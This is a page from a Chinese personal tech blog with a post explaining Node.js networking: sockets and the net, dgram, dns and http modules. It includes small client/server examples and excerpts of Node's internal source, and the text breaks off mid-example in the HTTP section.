<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>shouliang&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Node">
<meta property="og:type" content="website">
<meta property="og:title" content="shouliang&#39;s blog">
<meta property="og:url" content="https://shouliang.github.io/page/7/index.html">
<meta property="og:site_name" content="shouliang&#39;s blog">
<meta property="og:description" content="Node">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="shouliang&#39;s blog">
<meta name="twitter:description" content="Node">
  
    <link rel="alternate" href="/atom.xml" title="shouliang&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">shouliang&#39;s blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://shouliang.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Node.js/网络—node中的网络通信模块" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/08/08/Node.js/网络—node中的网络通信模块/" class="article-date">
  <time datetime="2017-08-08T14:16:53.000Z" itemprop="datePublished">2017-08-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/08/08/Node.js/网络—node中的网络通信模块/">网络—node中网络通信模块</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>目前，我们处于互联网时代，互联网产品百花齐放。例如，当打开浏览器，可以看到各种信息，浏览器是如何跟服务器进行通信的？当打开微信跟朋友聊天时，你是如何跟朋友进行消息传递的？这些都得靠网络进程之间的通信，都得依赖于socket。那什么是socket？node中有哪些跟网络通信有关的模块？这些问题是本文研究的重点。</p>
<h2 id="1-Socket"><a href="#1-Socket" class="headerlink" title="1. Socket"></a>1. Socket</h2><p>Socket源于Unix，而Unix的基本哲学是『一些皆文件』，都可以用『打开open ==&gt; 读/写(read/write) ==&gt; 关闭(close)』模式来操作，Socket也可以采用这种方法进行理解。关于Socket，可以总结如下几点:</p>
<ul>
<li>可以实现底层通信，几乎所有的应用层都是通过socket进行通信的，因此『一切且socket』</li>
<li>对TCP/IP协议进行封装，便于应用层协议调用，属于二者之间的中间抽象层</li>
<li>各个语言都与相关实现，例如C、C++、node</li>
<li>TCP/IP协议族中，传输层存在两种通用协议: TCP、UDP，两种协议不同，因为不同参数的socket实现过程也不一样</li>
</ul>
<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/ipc_180717.jpg" alt></p>
<h2 id="2-node中网络通信的架构实现"><a href="#2-node中网络通信的架构实现" class="headerlink" title="2. node中网络通信的架构实现"></a>2. node中网络通信的架构实现</h2><p>node中的模块，从两种语言实现角度来说，存在javscript、c++两部分，通过<code>process.binding</code>来建立关系。具体分析如下:</p>
<ul>
<li>标准的node模块有net、udp、dns、http、tls、https等</li>
<li>V8是chrome的内核，提供了javascript解释运行功能，里面包含tcp_wrap.h、udp_wrap.h、tls_wrap.h等</li>
<li>OpenSSL是基本的密码库，包括了MD5、SHA1、RSA等加密算法，构成了node标准模块中的<code>crypto</code></li>
<li>cares模块用于DNS的解析</li>
<li>libuv实现了跨平台的异步编程</li>
<li>http_parser用于http的解析</li>
</ul>
<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/socket_180717.png" alt></p>
<h2 id="3-net使用"><a href="#3-net使用" class="headerlink" title="3. net使用"></a>3. net使用</h2><p><a href="https://nodejs.org/api/net.html" target="_blank" rel="noopener">net模块</a>是基于TCP协议的socket网路编程模块，http模块就是建立在该模块的基础上实现的，先来看看基本使用方法:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建socket服务器 server.js</span></span><br><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>)</span><br><span class="line"><span class="keyword">const</span> server = net.createServer();</span><br><span class="line">server.on(<span class="string">'connection'</span>, (socket) =&gt; &#123;</span><br><span class="line">  socket.pipe(process.stdout);</span><br><span class="line">  socket.write(<span class="string">'data from server'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`server is on <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(server.address())&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建socket客户端 client.js</span></span><br><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">const</span> client = net.connect(&#123;<span class="attr">port</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">client.on(<span class="string">'connect'</span>, () =&gt; &#123;</span><br><span class="line">  client.write(<span class="string">'data from client'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">client.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(chunk.toString());</span><br><span class="line">  client.end();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 打开两个终端，分别执行`node server.js`、`node client.js`，可以看到客户端与服务器进行了数据通信。</span></span><br></pre></td></tr></table></figure>
<p>使用<code>const server = net.createServer();</code>创建了server对象，那server对象有哪些特点:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// net.js</span></span><br><span class="line">exports.createServer = function(options, connectionListener) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Server(options, connectionListener);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">function <span class="title">Server</span><span class="params">(options, connectionListener)</span> </span>&#123;</span><br><span class="line">  EventEmitter.call(<span class="keyword">this</span>);</span><br><span class="line">  ...</span><br><span class="line">  if (typeof connectionListener === 'function') &#123;</span><br><span class="line">    this.on('connection', connectionListener);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">this</span>._handle = null;</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(Server, EventEmitter);</span><br></pre></td></tr></table></figure>
<p>上述代码可以分为几个点:</p>
<ul>
<li><code>createServer</code>就是一个语法糖，帮助new生成server对象</li>
<li>server对象继承了EventEmitter，具有事件的相关方法</li>
<li>_handle是server处理的句柄，属性值最终由c++部分的<code>TCP</code>、<code>Pipe</code>类创建</li>
<li>connectionListener也是语法糖，作为connection事件的回调函数</li>
</ul>
<p>再来看看connectionListener事件的回调函数，里面包含一个<code>socket</code>对象，该对象是一个连接套接字，是个五元组(server_host、server_ip、protocol、client_host、client_ip)，相关实现如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onconnection</span>(<span class="params">err, clientHandle</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">var</span> socket = <span class="keyword">new</span> Socket(&#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;);</span><br><span class="line">  ...</span><br><span class="line">  self.emit(<span class="string">'connection'</span>, socket);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为Socket是继承了<code>stream.Duplex</code>，所以Socket也是一个可读可写流，可以使用流的方法进行数据的处理。</p>
<p>接下来就是很关键的端口监听(port)，这是server与client的主要区别，代码:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Server.prototype.listen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  listen(self, ip, port, addressType, backlog, fd, exclusive);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">listen</span>(<span class="params">self, address, port, addressType, backlog, fd, exclusive</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (!cluster) cluster = <span class="built_in">require</span>(<span class="string">'cluster'</span>);</span><br><span class="line">  <span class="keyword">if</span> (cluster.isMaster || exclusive) &#123;</span><br><span class="line">    self._listen2(address, port, addressType, backlog, fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cluster._getServer(self, &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;, cb);</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params">err, handle</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    self._handle = handle;</span><br><span class="line">    self._listen2(address, port, addressType, backlog, fd);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Server.prototype._listen2 = <span class="function"><span class="keyword">function</span>(<span class="params">address, port, addressType, backlog, fd</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>._handle) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    rval = createServerHandle(address, port, addressType, fd);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">this</span>._handle = rval;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>._handle.onconnection = onconnection;</span><br><span class="line">  <span class="keyword">var</span> err = _listen(<span class="keyword">this</span>._handle, backlog);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> _listen(<span class="params">handle, backlog</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> handle.listen(backlog || <span class="number">511</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码有几个点需要注意:</p>
<ul>
<li>监听的对象可以是端口、路径、定义好的server句柄、文件描述符</li>
<li>当通过cluster创建工作进程(worker)时，exclusive判断是否进行socket连接的共享</li>
<li>事件监听最终还是通过TCP/Pipe的listen来实现</li>
<li>backlog规定了socket连接的限制，默认最多为511</li>
</ul>
<p>接下来分析下listen中最重要的<code>_handle</code>了，_handle决定了server的功能:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function createServerHandle(address, port, addressType, fd) &#123;</span><br><span class="line">  ...</span><br><span class="line">  if (typeof fd === &apos;number&apos; &amp;&amp; fd &gt;= 0) &#123;</span><br><span class="line">    ...</span><br><span class="line">    handle = createHandle(fd);</span><br><span class="line">    ...</span><br><span class="line">  &#125; else if(port === -1 &amp;&amp; addressType === -1)&#123;</span><br><span class="line">    handle = new Pipe();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    handle = new TCP();</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  return handle;</span><br><span class="line">&#125;</span><br><span class="line">function createHandle(fd) &#123;</span><br><span class="line">  var type = TTYWrap.guessHandleType(fd);</span><br><span class="line">  if (type === &apos;PIPE&apos;) return new Pipe();</span><br><span class="line">  if (type === &apos;TCP&apos;) return new TCP();</span><br><span class="line">  throw new TypeError(&apos;Unsupported fd type: &apos; + type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_handle</code>由C++中的Pipe、TCP实现，因而要想完全搞清楚node中的网络通信，必须深入到V8的源码里面。</p>
<h2 id="4-UDP-dgram使用"><a href="#4-UDP-dgram使用" class="headerlink" title="4. UDP/dgram使用"></a>4. UDP/dgram使用</h2><p>跟net模块相比，基于UDP通信的dgram模块就简单了很多，因为不需要通过三次握手建立连接，所以整个通信的过程就简单了很多，对于数据准确性要求不太高的业务场景，可以使用该模块完成数据的通信。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server端实现</span></span><br><span class="line"><span class="keyword">const</span> dgram = <span class="built_in">require</span>(<span class="string">'dgram'</span>);</span><br><span class="line"><span class="keyword">const</span> server = dgram.createSocket(<span class="string">'udp4'</span>);</span><br><span class="line">server.on(<span class="string">'message'</span>, (msg, addressInfo) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(addressInfo);</span><br><span class="line">  <span class="built_in">console</span>.log(msg.toString());</span><br><span class="line">  <span class="keyword">const</span> data = Buffer.from(<span class="string">'from server'</span>);</span><br><span class="line">  server.send(data, addressInfo.port);</span><br><span class="line">&#125;);</span><br><span class="line">server.bind(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'server is on '</span>, server.address());</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// client端实现</span></span><br><span class="line"><span class="keyword">const</span> dgram = <span class="built_in">require</span>(<span class="string">'dgram'</span>);</span><br><span class="line"><span class="keyword">const</span> client = dgram.createSocket(<span class="string">'udp4'</span>);</span><br><span class="line"><span class="keyword">const</span> data = Buffer.from(<span class="string">'from client'</span>);</span><br><span class="line">client.send(data, <span class="number">3000</span>);</span><br><span class="line">client.on(<span class="string">'message'</span>, (msg, addressInfo) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(addressInfo);</span><br><span class="line">  <span class="built_in">console</span>.log(msg.toString());</span><br><span class="line">  client.close();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>从源码层面分析上述代码的原理实现:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">exports.createSocket = function(type, listener) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Socket(type, listener);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">function <span class="title">Socket</span><span class="params">(type, listener)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  var handle = newHandle(type);</span><br><span class="line">  <span class="keyword">this</span>._handle = handle;</span><br><span class="line">  ...</span><br><span class="line">  this.on('message', listener);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">util.inherits(Socket, EventEmitter);</span><br><span class="line">const UDP = process.binding('udp_wrap').UDP;</span><br><span class="line"><span class="function">function <span class="title">newHandle</span><span class="params">(type)</span> </span>&#123;</span><br><span class="line">  if (type == 'udp4') &#123;</span><br><span class="line">    <span class="keyword">const</span> handle = <span class="keyword">new</span> UDP();</span><br><span class="line">    handle.lookup = lookup4;</span><br><span class="line">    <span class="keyword">return</span> handle;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (type == 'udp6') &#123;</span><br><span class="line">    <span class="keyword">const</span> handle = <span class="keyword">new</span> UDP();</span><br><span class="line">    handle.lookup = lookup6;</span><br><span class="line">    handle.bind = handle.bind6;</span><br><span class="line">    handle.send = handle.send6;</span><br><span class="line">    <span class="keyword">return</span> handle;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">Socket.prototype.bind = function(port_ <span class="comment">/*, address, callback*/</span>) &#123;</span><br><span class="line">  ...</span><br><span class="line">  startListening(self);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">function <span class="title">startListening</span><span class="params">(socket)</span> </span>&#123;</span><br><span class="line">  socket._handle.onmessage = onMessage;</span><br><span class="line">  socket._handle.recvStart();</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">function <span class="title">onMessage</span><span class="params">(nread, handle, buf, rinfo)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  self.emit('message', buf, rinfo);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">Socket.prototype.send = function(buffer, offset, length, port, address, callback) &#123;</span><br><span class="line">  ...</span><br><span class="line">  self._handle.lookup(address, function afterDns(ex, ip) &#123;</span><br><span class="line">    doSend(ex, self, ip, <span class="built_in">list</span>, address, port, callback);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">const SendWrap = process.binding('udp_wrap').SendWrap;</span><br><span class="line"><span class="function">function <span class="title">doSend</span><span class="params">(ex, self, ip, <span class="built_in">list</span>, address, port, callback)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  var req = <span class="keyword">new</span> SendWrap();</span><br><span class="line">  ...</span><br><span class="line">  var err = self._handle.send(req, <span class="built_in">list</span>, <span class="built_in">list</span>.length, port, ip, !!callback);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码存在几个点需要注意:</p>
<ul>
<li>UDP模块没有继承stream，仅仅继承了EventEmit，后续的所有操作都是基于事件的方式</li>
<li>UDP在创建的时候需要注意ipv4和ipv6</li>
<li>UDP的_handle是由UDP类创建的</li>
<li>通信过程中可能需要进行DNS查询，解析出ip地址，然后再进行其他操作</li>
</ul>
<h2 id="5-DNS使用"><a href="#5-DNS使用" class="headerlink" title="5. DNS使用"></a>5. DNS使用</h2><p>DNS(Domain Name System)用于域名解析，也就是找到host对应的ip地址，在计算机网络中，这个工作是由网络层的ARP协议实现。在node中存在<code>net</code>模块来完成相应功能，其中dns里面的函数分为两类:</p>
<ul>
<li>依赖底层操作系统实现域名解析，也就是我们日常开发中，域名的解析规则，可以回使用浏览器缓存、本地缓存、路由器缓存、dns服务器，该类仅有<code>dns.lookup</code></li>
<li>该类的dns解析，直接到nds服务器执行域名解析</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dns = <span class="built_in">require</span>(<span class="string">'dns'</span>);</span><br><span class="line"><span class="keyword">const</span> host = <span class="string">'bj.meituan.com'</span>;</span><br><span class="line">dns.lookup(host, (err, address, family) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'by net.lookup, address is: %s, family is: %s'</span>, address, family);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">dns.resolve(host, (err, address) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'by net.resolve, address is: %s'</span>, address);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// by net.resolve, address is: 103.37.152.41</span></span><br><span class="line"><span class="comment">// by net.lookup, address is: 103.37.152.41, family is: 4</span></span><br></pre></td></tr></table></figure>
<p>在这种情况下，二者解析的结果是一样的，但是假如我们修改本地的/etc/hosts文件呢</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在/etc/host文件中，增加:</span></span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span> bj.meituan.com</span><br><span class="line"></span><br><span class="line"><span class="comment">// 然后再执行上述文件，结果是:</span></span><br><span class="line">by net.resolve, address is: <span class="number">103.37</span><span class="number">.152</span><span class="number">.41</span></span><br><span class="line">by net.lookup, address is: <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>, family is: <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>接下来分析下dns的内部实现:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">const cares = process.binding('cares_wrap');</span><br><span class="line"><span class="keyword">const</span> GetAddrInfoReqWrap = cares.GetAddrInfoReqWrap;</span><br><span class="line">exports.lookup = function lookup(hostname, options, callback) &#123;</span><br><span class="line">  ...</span><br><span class="line">  callback = makeAsync(callback);</span><br><span class="line">  ...</span><br><span class="line">  var req = <span class="keyword">new</span> GetAddrInfoReqWrap();</span><br><span class="line">  req.callback = callback;</span><br><span class="line">  var err = cares.getaddrinfo(req, hostname, family, hints);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">resolver</span><span class="params">(bindingName)</span> </span>&#123;</span><br><span class="line">  var binding = cares[bindingName];</span><br><span class="line">  <span class="keyword">return</span> function query(name, callback) &#123;</span><br><span class="line">    ...</span><br><span class="line">    callback = makeAsync(callback);</span><br><span class="line">    var req = <span class="keyword">new</span> QueryReqWrap();</span><br><span class="line">    req.callback = callback;</span><br><span class="line">    var err = binding(req, name);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> req;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var resolveMap = Object.create(null);</span><br><span class="line">exports.resolve4 = resolveMap.A = resolver('queryA');</span><br><span class="line">exports.resolve6 = resolveMap.AAAA = resolver('queryAaaa');</span><br><span class="line">...</span><br><span class="line">exports.resolve = function(hostname, type_, callback_) &#123;</span><br><span class="line">  ...</span><br><span class="line">  resolver = resolveMap[type_];</span><br><span class="line">  <span class="keyword">return</span> resolver(hostname, callback);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的源码有几个点需要关注:</p>
<ul>
<li>lookup与resolve存在差异，使用的时候需要注意</li>
<li>不管是lookup还是resolve，均依赖于cares库</li>
<li>域名解析的type很多: resolve4、resolve6、resolveCname、resolveMx、resolveNs、resolveTxt、resolveSrv、resolvePtr、resolveNaptr、resolveSoa、reverse</li>
</ul>
<h2 id="6-HTTP使用"><a href="#6-HTTP使用" class="headerlink" title="6. HTTP使用"></a>6. HTTP使用</h2><p>在WEB开发中，HTTP作为最流行、最重要的应用层，是每个开发人员应该熟知的基础知识，我面试的时候必问的一块内容。同时，大多数同学接触node时，首先使用的恐怕就是http模块。先来一个简单的demo看看:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> server = http.createServer();</span><br><span class="line">server.on(<span class="string">'request'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(<span class="string">'foo'</span>, <span class="string">'test'</span>);</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  res.write(<span class="string">'&lt;!doctype&gt;'</span>);</span><br><span class="line">  res.end(<span class="string">`&lt;html&gt;&lt;/html&gt;`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'server is on '</span>, server.address());</span><br><span class="line">  <span class="keyword">var</span> req = http.request(&#123; <span class="attr">host</span>: <span class="string">'127.0.0.1'</span>, <span 